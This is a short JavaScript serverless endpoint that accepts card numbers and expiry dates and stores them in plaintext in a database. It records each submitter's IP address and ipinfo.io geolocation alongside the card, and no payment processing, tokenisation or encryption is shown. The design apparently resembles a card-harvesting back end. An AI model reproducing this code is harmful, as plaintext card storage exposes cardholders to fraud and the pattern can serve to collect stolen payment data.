const { pool, ensureTables } = require('./lib/db');

module.exports = async function handler(req, res) {
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { cardNumber, expiry } = req.body;

        if (!cardNumber) {
            return res.status(400).json({ error: 'Card number is required' });
        }

        // Get user IP from Vercel headers
        const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
            || req.headers['x-real-ip']
            || req.connection?.remoteAddress
            || 'unknown';

        // Get IP info from ipinfo.io
        let ipInfo = null;
        try {
            const ipRes = await fetch(`https://ipinfo.io/${ip}/json`);
            if (ipRes.ok) {
                ipInfo = await ipRes.json();
            }
        } catch (e) {
            console.log('Could not fetch IP info:', e.message);
        }

        // Ensure tables exist
        await ensureTables();

        // Insert into database
        const client = await pool.connect();
        try {
            await client.query(
                `INSERT INTO cards (card_number, expiry, ip_address, ip_info) 
                 VALUES ($1, $2, $3, $4)`,
                [cardNumber, expiry || null, ip, ipInfo ? JSON.stringify(ipInfo) : null]
            );
        } finally {
            client.release();
        }

        return res.status(200).json({ success: true });

    } catch (error) {
        console.error('Error saving card:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
};
